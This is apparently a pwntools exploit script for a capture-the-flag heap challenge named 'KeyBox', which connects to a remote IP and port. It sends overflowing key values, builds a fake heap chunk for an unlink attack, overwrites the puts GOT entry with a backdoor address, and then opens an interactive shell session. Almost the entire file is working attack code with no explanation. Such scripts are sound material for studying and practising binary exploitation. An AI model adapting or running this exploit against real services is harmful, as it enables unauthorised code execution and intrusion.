from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./KeyBox')
else:
    io = remote('116.236.144.37',22609)

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

def new(size, content='\n'):
    io.sendlineafter(b"our choice:",str(2).encode())
    size = int(hex(size),16)
    io.sendlineafter(b"nter the length of the item:",str(size).encode())
    io.sendafter(b"item:", content)

def delete(idx):
    io.sendlineafter(b"ce:",str(4).encode())
    io.sendlineafter(b"dex of item:", str(idx).encode())

def show():
    io.sendlineafter(b"",str(1).encode())

def edit(idx, size, content):
    io.sendlineafter(b"ce:",str(3).encode())
    io.sendlineafter(b"index of item:", str(idx).encode())

    size = int(hex(size),16)
    io.sendlineafter(b"ter the length of item:", str(size).encode())
    io.sendafter(b"",content)


k1 = str(-2305843009213693940).encode()
io.sendlineafter(b"key:", k1)
#p()
k2 = str(1).encode()
io.sendlineafter(b"key:", k2)

new(0x100)
new(0x100)
new(0x100)
new(0x420)
fake_chunk = p64(0) + p64(0x101)
fake_fd = 0x4040e8 - 0x18
fake_bk = 0x4040e8 - 0x10
fake_chunk += p64(fake_fd)
fake_chunk += p64(fake_bk)
fake_chunk += 28 * p64(0) 
fake_chunk += p64(0x100) + p64(0x430)

#p()
edit(2,0x110, fake_chunk)
delete(3)

puts_got = 0x404020
#p()
edit(2,0x10,p64(100) + p64(puts_got))
back_door = 0x401765
#p()
edit(1,0x8, b'\x65\x17\x40\x00\x00\x00\x00')

io.sendlineafter(b"ce:",str(7).encode())

io.interactive()

